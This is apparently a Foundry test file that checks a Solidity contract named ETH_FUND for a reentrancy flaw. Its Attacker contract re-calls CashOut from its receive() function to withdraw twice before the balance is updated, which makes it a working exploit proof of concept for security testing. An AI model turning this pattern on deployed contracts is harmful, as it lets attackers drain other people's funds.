
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "forge-std/src/Test.sol";
import "../src/ETH_FUND.sol";

contract TestReentrancyETH_FUND is Test {

    ETH_FUND public _contractUnderTest;
    Log public transferLog;
    Attacker public _attacker;

    function setUp() public {
        transferLog = new Log();
        _contractUnderTest = new ETH_FUND(address(transferLog));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 1 ether);
        vm.assume(attackVal <= type(uint128).max / 2);

        vm.deal(address(_contractUnderTest), attackVal * 2); 
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        vm.roll(block.number + 1);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_FUND public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;
    bool public reenteredWithOldState;

    constructor(address victimAddress) { 
        victim = ETH_FUND(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        reenteredWithOldState = false;
        
        storedVal = val;
        victim.Deposit{value: val * 2}();
    }

    function attack(uint256 val) public {
        initialSnapshot = victim.balances(address(this));
        victim.CashOut(storedVal);
        exploitSucceeded = reenteredWithOldState;
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            if (victim.balances(address(this)) == initialSnapshot) {
                reenteredWithOldState = true;
            }
            victim.CashOut(storedVal);
        }
    }
}
